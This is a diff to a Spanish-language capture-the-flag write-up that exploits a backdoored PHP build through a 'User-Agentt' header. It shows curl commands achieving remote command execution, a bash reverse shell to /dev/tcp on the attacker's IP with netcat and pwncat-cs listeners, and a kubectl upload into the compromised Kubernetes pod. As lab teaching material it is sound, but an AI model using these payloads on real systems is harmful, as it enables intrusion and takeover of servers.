@@ -199,19 +199,127 @@ Despues de lanzar los scripts basicos de reconocimiento de nmap hemos obtenido t
   
   ![image](https://github.com/Esevka/CTF/assets/139042999/433b67b9-738a-4b4d-80cc-2fc0cb5e67cb)
 
-  Buscando info sobre la version de php que esta corriendo la maquina encontramos un backdoor para esta version que nos permite realizar un RCE.
+  Buscando info sobre la version de php que esta corriendo la maquina encontramos un backdoor para esta version que nos permite realizar un RCE,
+  analizamos el backdoor y vemos que enviando en la cabecera de la solicitud  ---- "User-Agentt": "zerodiumsystem('" + cmd + "');" ---- podemos ejecutar comandos.
 
-  INFO: https://www.exploit-db.com/exploits/49933
+  Exploit: https://www.exploit-db.com/exploits/49933
 
-  Analizamos el backdoor y vemos que enviando en la cabecera de la solicitud  ---- "User-Agentt": "zerodiumsystem('" + cmd + "');" ---- podemos ejecutar comandos.
 
-- Montamos nuestra Request y probamos.
+- Montamos nuestra Request y explotamos el RCE.
 
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
+        └─# curl http://10.10.62.132:30679/ -H "User-Agentt:zerodiumsystem('ls -la');"
+        total 16
+        drwxrwxr-x 2 1000 1000 4096 Mar 21  2022 .
+        drwxr-xr-x 3 root root 4096 Mar 30  2021 ..
+        -rw-rw-r-- 1 1000 1000  640 Mar 21  2022 index.php
+        -rw-rw-r-- 1 1000 1000   20 Mar 21  2022 info.php
+        <html>
+        <head>
+            <title>FRANK RULEZZ!</title>
+        </head>
+        <body>
+            <h1>FRANK's WORLD DOMINATION RESTART!</h1><br>
+
+## Obtenemos Reverse Shell
+
+-Nos ponemos en escucha con netcat en nuestra maquina a la espera de la shell.
+
+    ┌──(root㉿kali)-[/home/kali]
+    └─# nc -lnvp 1988
+    listening on [any] 1988 ...
+    connect to [10.9.92.151] from (UNKNOWN) [10.10.62.132] 22813
+    bash: cannot set terminal process group (1): Inappropriate ioctl for device
+    bash: no job control in this shell
+    root@php-deploy-6d998f68b9-wlslz:/var/www/html# id
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+    root@php-deploy-6d998f68b9-wlslz:/var/www/html# 
+
+-Ejecutamos la reverse shell a traves de curl.
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
+    └─# curl http://10.10.62.132:30679/ -H "User-Agentt:zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/10.9.92.151/1988 0>&1'\");"
     
-
-    
-    
+-Upgradeamos la reverse shell a full tty para poder trabajar mas comodamente y no perder la conexion  
   
-  
+      root@php-deploy-6d998f68b9-wlslz:/var/www/html# SHELL=/bin/bash script -q /dev/null
+    <:/var/www/html# SHELL=/bin/bash script -q /dev/null
+    root@php-deploy-6d998f68b9-wlslz:/var/www/html# ^Z
+    zsh: suspended  nc -lnvp 1988
+                                                                                                                                                                                  
+    ┌──(root㉿kali)-[/home/kali]
+    └─# stty raw -echo && fg
+    [1]  + continued  nc -lnvp 1988
+    
+    root@php-deploy-6d998f68b9-wlslz:/var/www/html# export TERM=xterm
+    root@php-deploy-6d998f68b9-wlslz:/var/www/html# stty rows 42 columns 174
+
+-Sabemos que la maquina esta ejecutando kubernetes, por lo que intentamos tirar de ---> Kubectl(es una interfaz de línea de comandos para ejecutar comandos sobre despliegues clusterizados de Kubernetes) y vemos que no esta instalada en la maquina. Listando las variables de entorno vemos que si que verdaderanmente kubernete esta funcionando en la maquina
+
+        root@php-deploy-6d998f68b9-wlslz:/var/www/html# env
+        KUBERNETES_SERVICE_PORT_HTTPS=443
+        PHP_DEPLOY_SERVICE_HOST=10.152.183.188
+        KUBERNETES_SERVICE_PORT=443
+        HISTCONTROL=ignorespace
+        HOSTNAME=php-deploy-6d998f68b9-wlslz
+        PHP_INI_DIR=/usr/local/etc/php
+        PHP_DEPLOY_SERVICE_PORT=80
+        PWD=/var/www/html
+        PHP_DEPLOY_PORT_80_TCP_PORT=80
+        HOME=/root
+        KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
+        PHP_DEPLOY_PORT_80_TCP=tcp://10.152.183.188:80
+        PHPIZE_DEPS=autoconf         dpkg-dev         file         g++         gcc         libc-dev         make         pkg-config         re2c         bison
+        TERM=xterm-256color
+        PHP_DEPLOY_PORT=tcp://10.152.183.188:80
+        SHLVL=3
+        KUBERNETES_PORT_443_TCP_PROTO=tcp
+        KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
+        PHP_DEPLOY_PORT_80_TCP_ADDR=10.152.183.188
+        PHP_DEPLOY_PORT_80_TCP_PROTO=tcp
+        PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
+        KUBERNETES_SERVICE_HOST=10.152.183.1
+        KUBERNETES_PORT=tcp://10.152.183.1:443
+        KUBERNETES_PORT_443_TCP_PORT=443
+        PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+        _=/usr/bin/env
+
+-La maquina no nos da la opcion de usar curl, wget, netcat para subir kubectl a la maquina victima, por lo que vamos a tener que volver a realizar la conexion tirando de pwncat-cs
+
+## Obtenemos Reverse Shell mediante Pwncat.
+
+-Nos ponemos en escucha con Pwncat y volvemos a ejecutar el exploit  con curl. 
+    Con control+d cambiamos en pwncat entre la maquina local y la remota.
+
+    ┌──(root㉿kali)-[/home/…/ctf/frank-herby/content/ssh]
+    └─# pwncat-cs -lp 1988
+    /usr/local/lib/python3.11/dist-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
+      'class': algorithms.Blowfish,
+    [18:31:46] Welcome to pwncat 🐈!                                                                                                                               __main__.py:164
+    [18:32:23] received connection from 10.10.62.132:40359                                                                                                              bind.py:84
+    [18:32:25] 10.10.62.132:40359: registered new host w/ db                                                                                                        manager.py:957
+    (local) pwncat$
+    Active Session: 10.10.62.132:40359  
+    
+##Explotamos Kubernete y obtenemos las flags.
+
+-Nos descargamos kubectl URL--> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
+
+    ┌──(root㉿kali)-[/home/…/ctf/frank-herby/content/kube]
+    └─# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" 
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+    100   138  100   138    0     0    807      0 --:--:-- --:--:-- --:--:--   811
+    100 46.9M  100 46.9M    0     0  8492k      0  0:00:05  0:00:05 --:--:-- 9059k
+    
+-Subimos kubectl a la maquina victima.
+    
+    (remote) root@php-deploy-6d998f68b9-wlslz:/var/www/html# 
+    (local) pwncat$ upload ../kube/kubectl /tmp/kubectl
+    /tmp/kubectl ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 49.3/49.3 MB • 1.4 MB/s • 0:00:00
+    [18:46:44] uploaded 49.26MiB in 42.07 seconds                                                                                                                     upload.py:76
+    
+
 
 
